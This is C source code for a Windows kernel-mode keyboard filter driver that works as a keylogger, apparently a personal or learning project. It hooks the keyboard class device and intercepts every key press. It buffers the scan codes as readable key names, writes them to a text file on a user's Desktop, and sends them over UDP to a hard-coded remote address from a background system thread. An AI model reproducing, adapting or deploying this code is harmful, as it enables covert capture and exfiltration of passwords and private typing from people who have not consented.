#include <ntddk.h>
#include <ndkpi.h>
#include <ws2def.h>
#include <wsk.h>
#include <ndisndk.h>
#include <wskndk.h>


#define MAX_KEYS_IN_BUFFER 10

NTSTATUS CreateSocketComplete(PDEVICE_OBJECT DeviceObject, PIRP irp, PVOID contexd);
NTSTATUS BindComplete(PDEVICE_OBJECT, PIRP irp, PVOID context);
NTSTATUS BindSocket(PWSK_SOCKET socket, PSOCKADDR localAddr);
NTSTATUS SendComplete(PDEVICE_OBJECT DeviceObject, PIRP irp, PVOID context);
NTSTATUS CloseSocketComplete(PDEVICE_OBJECT DeviceObject, PIRP irp, PVOID context);

typedef struct {
	PDEVICE_OBJECT LowerKbdDevice;
}DEVICE_EXTENSION, * PDEVICE_EXTENSION;

typedef struct _KEYBOARD_INPUT_DATA {
	USHORT UnitId;
	USHORT MakeCode;
	USHORT Flags;
	USHORT Reserved;
	ULONG  ExtraInformation;
} KEYBOARD_INPUT_DATA, * PKEYBOARD_INPUT_DATA;

typedef struct _WSK_APP_SOCKET_CONTEXT {
	PWSK_SOCKET Socket;
} WSK_APP_SOCKET_CONTEXT, * PWSK_APP_SOCKET_CONTEXT;


char* AsciiTable[83] = { "{ESC}", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "{BACKSPACE}", "{TAB}", "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "{ENTER}", "{CTRL}", "A", "S", "D", "F", "G", "H", "J", "K", "L", ";", "'", "~", "{LSHIFT}", "\\", "Z", "X", "C", "V", "B", "N", "M", ",", ".", "/", "{RSHIFT}", "???", "{LALT}", "{SPACE}", "{CAPS}", "{F1}", "{F2}", "{F3}", "{F4}", "{F5}", "{F6}", "{F7}", "{F8}", "{F9}", "{F10}", "{NUM}", "{SCROLL}", "{HOME}", "{UP}", "{PGUP}", "???", "{LEFT}", "{CENTER}" , "{RIGHT}", "???", "{END}", "{DOWN}", "{PGDN}", "{INS}", "{DEL}" };
char* KeyFlag[4] = { "KeyDown", "KeyUP", "E0", "E1" };
char buffer1[100], buffer2[100];
int keysInBuffer = 0, charInBuffer1 = 0, charInBuffer2 = 0;
int currentBuffer = 1;

BOOLEAN closeThread = FALSE;
BOOLEAN saveBuffer = FALSE;
HANDLE filehandle, ThreadHandle;
KEVENT ev;
PETHREAD ptThreadObj;

PDEVICE_OBJECT MyKbdDevice = NULL;
ULONG pendingKey = 0;


NTSTATUS CloseSocket(PWSK_SOCKET socket, PWSK_APP_SOCKET_CONTEXT SocketContext)
{
	PWSK_PROVIDER_BASIC_DISPATCH Dispatch;
	PIRP Irp;
	NTSTATUS Status;
	Dispatch = (PWSK_PROVIDER_BASIC_DISPATCH)(socket->Dispatch);
	Irp = IoAllocateIrp(1, FALSE);
	if (!Irp)
		return STATUS_INSUFFICIENT_RESOURCES;
	IoSetCompletionRoutine(Irp, CloseSocketComplete, SocketContext, TRUE, TRUE, TRUE);
	Status = Dispatch->WskCloseSocket(socket, Irp);
	return Status;
}

NTSTATUS CloseSocketComplete(PDEVICE_OBJECT DeviceObject, PIRP irp, PVOID context)
{
	if (irp->IoStatus.Status == STATUS_SUCCESS)
		DbgPrint("Successfully closed socket\n");
	IoFreeIrp(irp);
	return STATUS_MORE_PROCESSING_REQUIRED;
}

NTSTATUS SendData(PWSK_SOCKET socket, PWSK_BUF buffer, PSOCKADDR remoteAddress)
{
	NTSTATUS status;
	PWSK_PROVIDER_DATAGRAM_DISPATCH Dispatch = socket->Dispatch;
	PIRP irp = IoAllocateIrp(1, FALSE);
	if (!irp)
		return STATUS_INSUFFICIENT_RESOURCES;
	IoSetCompletionRoutine(irp, SendComplete, buffer, TRUE, TRUE, TRUE);
	status = Dispatch->WskSendTo(socket, buffer, 0, remoteAddress, 0, NULL, irp);
	if (!NT_SUCCESS(status))
		DbgPrint("Failed to send\n");
	return status;
}

NTSTATUS SendComplete(PDEVICE_OBJECT DeviceObject, PIRP irp, PVOID context)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	PWSK_BUF buffer;
	ULONG byteCount;
	if (irp->IoStatus.Status == STATUS_SUCCESS)
	{
		buffer = (PWSK_BUF)context;
		IoFreeMdl(buffer->Mdl);
		byteCount = (ULONG)(irp->IoStatus.Information);
		DbgPrint("Successfully sent %lu bytes of data\n", byteCount);
	}
	else
	{
		DbgPrint("Failed to send data. Status: %ld\n", irp->IoStatus.Status);
	}
	IoFreeIrp(irp);
	return STATUS_MORE_PROCESSING_REQUIRED;
}

NTSTATUS CreateSocket(PWSK_PROVIDER_NPI wskProviderNpi, PWSK_APP_SOCKET_CONTEXT SocketContext, PWSK_CLIENT_DATAGRAM_DISPATCH Dispatch)
{
	PIRP irp;
	NTSTATUS status;
	irp = IoAllocateIrp(1, FALSE);
	if (!irp)
		return STATUS_INSUFFICIENT_RESOURCES;
	IoSetCompletionRoutine(irp, CreateSocketComplete, SocketContext, TRUE, TRUE, TRUE);
	status = wskProviderNpi->Dispatch->WskSocket(wskProviderNpi->Client, AF_INET, SOCK_DGRAM, IPPROTO_UDP, WSK_FLAG_DATAGRAM_SOCKET, SocketContext, Dispatch, NULL, NULL, NULL, irp);
	return status;
}

NTSTATUS CreateSocketComplete(PDEVICE_OBJECT DeviceObject, PIRP Irp, PVOID Context)
{
	PWSK_APP_SOCKET_CONTEXT SocketContext;
	NTSTATUS status;
	UNREFERENCED_PARAMETER(DeviceObject);
	if (Irp->IoStatus.Status == STATUS_SUCCESS)
	{
		SocketContext = (PWSK_APP_SOCKET_CONTEXT)Context;
		SOCKADDR_IN localAddress = { 0 };
		localAddress.sin_family = AF_INET;
		localAddress.sin_port = RtlUshortByteSwap(55000);
		localAddress.sin_addr.S_un.S_addr = INADDR_ANY;
		SocketContext->Socket = (PWSK_SOCKET)(Irp->IoStatus.Information);
		status = BindSocket(SocketContext->Socket, (PSOCKADDR)&localAddress);
		if (!NT_SUCCESS(status))
		{
			DbgPrint("Error binding socket\n");
		}
		else
			DbgPrint("Successfully binded socket\n");
	}
	IoFreeIrp(Irp);
	return STATUS_MORE_PROCESSING_REQUIRED;
}


NTSTATUS BindSocket(PWSK_SOCKET socket, PSOCKADDR localAddr)
{
	PWSK_PROVIDER_DATAGRAM_DISPATCH Dispatch;
	PIRP irp;
	NTSTATUS status;
	Dispatch = (PWSK_PROVIDER_DATAGRAM_DISPATCH)socket->Dispatch;
	irp = IoAllocateIrp(1, FALSE);
	if (!irp)
		return STATUS_INSUFFICIENT_RESOURCES;
	IoSetCompletionRoutine(irp, BindComplete, socket, TRUE, TRUE, TRUE);
	status = Dispatch->WskBind(socket, localAddr, 0, irp);
	return status;
}

NTSTATUS BindComplete(PDEVICE_OBJECT DeviceObject, PIRP irp, PVOID context)
{
	UNREFERENCED_PARAMETER(DeviceObject);
	IoFreeIrp(irp);
	return STATUS_MORE_PROCESSING_REQUIRED;
}

VOID WriteToBuff(int ScanCode)
{
	int i = 0;
	while (AsciiTable[ScanCode][i] != '\0')
	{
		if (currentBuffer == 1)
		{
			buffer1[charInBuffer1] = AsciiTable[ScanCode][i];
			charInBuffer1++;
		}
		else
		{
			buffer2[charInBuffer2] = AsciiTable[ScanCode][i];
			charInBuffer2++;
		}
		i++;
	}
}

void SwitchBuffer()
{
	if (currentBuffer == 1)
	{
		currentBuffer = 2;
		charInBuffer2 = 0;
	}
	else
	{
		currentBuffer = 1;
		charInBuffer1 = 0;
	}
	keysInBuffer = 0;
}

void SendAndSaveToFile(PVOID Context)	//Thread to save buffer data to disc on event signal
{
	UNICODE_STRING fileName = RTL_CONSTANT_STRING(L"\\DosDevices\\C:\\Users\\Jedrzej\\Desktop\\1.txt");
	NTSTATUS status;
	IO_STATUS_BLOCK IoStatusBlock = { 0 };
	OBJECT_ATTRIBUTES obj_attr;
	WSK_APP_SOCKET_CONTEXT socketContext;
	const WSK_CLIENT_DISPATCH WskAppDispatch = { MAKE_WSK_VERSION(1, 0), 0, NULL };
	WSK_REGISTRATION WskRegistration;
	WSK_CLIENT_NPI wskClientNpi;
	WSK_PROVIDER_NPI wskProviderNpi;
	WSK_BUF buf;
	PMDL mdl;
	SOCKADDR_IN remoteAddress = { 0 };

	remoteAddress.sin_family = AF_INET;
	remoteAddress.sin_port = RtlUshortByteSwap(55000);
	remoteAddress.sin_addr.S_un.S_addr = RtlUlongByteSwap((ULONG)3232249857);
	wskClientNpi.ClientContext = NULL;
	wskClientNpi.Dispatch = &WskAppDispatch;
	status = WskRegister(&wskClientNpi, &WskRegistration);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("Failed to register network application\n");
		return;
	}
	status = WskCaptureProviderNPI(&WskRegistration, WSK_INFINITE_WAIT, &wskProviderNpi);
	if (!NT_SUCCESS(status))
	{
		if (status == STATUS_NOINTERFACE) {
			DbgPrint("WSK application's requested version is not supported");
		}
		return;
	}
	status = CreateSocket(&wskProviderNpi, &socketContext, NULL);
	if (!NT_SUCCESS(status))
		DbgPrint("Failed to create binded socket\n");
	else
		DbgPrint("Successfully created and binded socket\n");

	InitializeObjectAttributes(&obj_attr, &fileName, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, NULL, NULL);
	status = ZwCreateFile(&filehandle, FILE_APPEND_DATA,
		&obj_attr, &IoStatusBlock,
		NULL, FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE | FILE_SHARE_READ,				//OPEN OR CREATE FILE TO WRITE DOWN KEYS
		FILE_OPEN_IF, FILE_SYNCHRONOUS_IO_NONALERT, NULL, 0);
	if (!NT_SUCCESS(status))
		DbgPrint("Failed to create/open file.\n");
	else
		DbgPrint("Succesfully opened file.\n");

	while (closeThread == FALSE)
	{
		KeWaitForSingleObject(&ev, Executive, KernelMode, FALSE, NULL);
		DbgPrint("Writing to file\n");
		if (currentBuffer == 1)
		{
			mdl = IoAllocateMdl(buffer2, charInBuffer2, FALSE, FALSE, NULL);
			MmBuildMdlForNonPagedPool(mdl);
			buf.Mdl = mdl;
			buf.Length = charInBuffer2;
			buf.Offset = 0;
			DbgPrint("Successfully created MDL\n");
			ZwWriteFile(filehandle, NULL, NULL, NULL, &IoStatusBlock, buffer2, charInBuffer2, NULL, NULL);
		}
		else
		{
			mdl = IoAllocateMdl(buffer1, charInBuffer1, FALSE, FALSE, NULL);
			MmBuildMdlForNonPagedPool(mdl);
			buf.Mdl = mdl;
			buf.Length = charInBuffer1;
			buf.Offset = 0;
			DbgPrint("Successfully created MDL\n");
			ZwWriteFile(filehandle, NULL, NULL, NULL, &IoStatusBlock, buffer1, charInBuffer1, NULL, NULL);
		}
		DbgPrint("Sending data\n");
		status = SendData(socketContext.Socket, &buf, &remoteAddress);
		if (status == STATUS_SUCCESS)
			DbgPrint("Data sent\n");
		DbgPrint("Finished sending and writing to file\n");
		KeResetEvent(&ev);
	}
	status = CloseSocket(socketContext.Socket, &socketContext);
	if (NT_SUCCESS(status))
		DbgPrint("Successfully closed socket\n");
	else
		DbgPrint("Failed to close socket\n");
	WskReleaseProviderNPI(&WskRegistration);
	WskDeregister(&WskRegistration);
	PsTerminateSystemThread(STATUS_SUCCESS);
}

void DriverUnload(PDRIVER_OBJECT DriverObject)
{
	closeThread = TRUE;
	LARGE_INTEGER interval = { 0 };
	interval.QuadPart = -10 * 1000 * 1000;	//1 sekunda
	SwitchBuffer();
	KeSetEvent(&ev, IO_NO_INCREMENT, FALSE);	//Save buffer to disc

	DbgPrint("Waiting for Thread to close\n");
	KeWaitForSingleObject(ptThreadObj, Executive, KernelMode, FALSE, NULL);	//wait for thread to close
	ObDereferenceObject(ptThreadObj);
	DbgPrint("Thread Closed\n");

	IoDetachDevice(((PDEVICE_EXTENSION)DriverObject->DeviceObject->DeviceExtension)->LowerKbdDevice);
	IoDeleteDevice(MyKbdDevice);
	DbgPrint("Waiting for driver to complete routine\n");
	while (pendingKey)
		KeDelayExecutionThread(KernelMode, FALSE, &interval);
	ZwClose(ThreadHandle);	//close handles
	ZwClose(filehandle);
	DbgPrint("Driver successfully unloaded\n");
}

NTSTATUS InterruptHandling(PDEVICE_OBJECT DeviceObject, PIRP irp, PVOID Context)	//Interrupt Function
{
	DbgPrint("Handling IRP\n");
	if (irp->IoStatus.Status == STATUS_SUCCESS)
	{
		PKEYBOARD_INPUT_DATA KbdData = irp->AssociatedIrp.SystemBuffer;
		int numberOfKeys = irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA);
		for (int i = 0; i < numberOfKeys; i++)
		{
			if (KbdData[i].Flags == 0)	//KEY DOWN
			{
				WriteToBuff(KbdData[i].MakeCode - 1);
				keysInBuffer++;
				if (keysInBuffer == MAX_KEYS_IN_BUFFER)
				{
					SwitchBuffer();
					KeSetEvent(&ev, 1, FALSE);
					DbgPrint("Event is set\n");
				}
			}
			DbgPrint("%s. %s\n", AsciiTable[KbdData[i].MakeCode - 1], KeyFlag[KbdData[i].Flags]);
		}

	}
	if (irp->PendingReturned)
	{
		IoMarkIrpPending(irp);
	}
	pendingKey--;
	return irp->IoStatus.Status;
}

NTSTATUS DispatchRead(PDEVICE_OBJECT DeviceObject, PIRP irp)		//Setting up Interrupt Function in DeviceStack
{
	DbgPrint("Request to handle key\n");
	NTSTATUS status;
	IoCopyCurrentIrpStackLocationToNext(irp);
	IoSetCompletionRoutine(irp, InterruptHandling, NULL, TRUE, TRUE, TRUE);
	pendingKey++;
	status = IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->LowerKbdDevice, irp);
	return status;
}

NTSTATUS DispatchPass(PDEVICE_OBJECT DeviceObject, PIRP irp)
{
	IoCopyCurrentIrpStackLocationToNext(irp);
	return IoCallDriver(((PDEVICE_EXTENSION)DeviceObject->DeviceExtension)->LowerKbdDevice, irp);
}

NTSTATUS MyAttachDevice(PDRIVER_OBJECT DriverObject)		//Creating virtual device and attaching it to keyboard
{
	NTSTATUS status = IoCreateDevice(DriverObject, sizeof(DEVICE_EXTENSION), NULL, FILE_DEVICE_KEYBOARD, 0, FALSE, &MyKbdDevice);
	if (!NT_SUCCESS(status))
	{
		return status;
	}
	UNICODE_STRING DevName = RTL_CONSTANT_STRING(L"\\Device\\KeyboardClass0");
	MyKbdDevice->Flags |= DO_BUFFERED_IO;
	MyKbdDevice->Flags &= ~DO_DEVICE_INITIALIZING;
	RtlZeroMemory(MyKbdDevice->DeviceExtension, sizeof(DEVICE_EXTENSION));
	status = IoAttachDevice(MyKbdDevice, &DevName, &((PDEVICE_EXTENSION)MyKbdDevice->DeviceExtension)->LowerKbdDevice);
	if (!NT_SUCCESS(status))
	{
		IoDeleteDevice(MyKbdDevice);
		return status;
	}
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)
{
	NTSTATUS deviceStatus, threadStatus, threadObjectStatus;
	DriverObject->DriverUnload = DriverUnload;
	for (int i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		DriverObject->MajorFunction[i] = DispatchPass;				// SET DRIVER FUNCTIONS
	}
	DriverObject->MajorFunction[IRP_MJ_READ] = DispatchRead;
	DbgPrint("Driver Loaded\n");

	KeInitializeEvent(&ev, NotificationEvent, FALSE);
	DbgPrint("Event initialized\n");

	deviceStatus = MyAttachDevice(DriverObject);
	if (!NT_SUCCESS(deviceStatus))
		DbgPrint("Failed to attach.\n");							//CREATE AND ATTACH VIRTUAL DEVICE
	else
		DbgPrint("Successfullly attached device.\n");

	threadStatus = PsCreateSystemThread(&ThreadHandle, DELETE | SYNCHRONIZE, NULL, NULL, NULL, SendAndSaveToFile, NULL);
	if (!NT_SUCCESS(threadStatus))
		DbgPrint("Failed to create thread\n");
	else
		DbgPrint("Successfully created Thread\n");
	threadObjectStatus = ObReferenceObjectByHandle(ThreadHandle, THREAD_ALL_ACCESS, NULL, KernelMode, &ptThreadObj, NULL);	//creating thread to save data to file
	if (!NT_SUCCESS(threadObjectStatus))
	{
		DbgPrint("Failed to obtain Thread Object\n");
		ptThreadObj = NULL;
		closeThread = TRUE;
	}
	else
		DbgPrint("Successfully obtained Thread Object\n");
	
	return deviceStatus;
}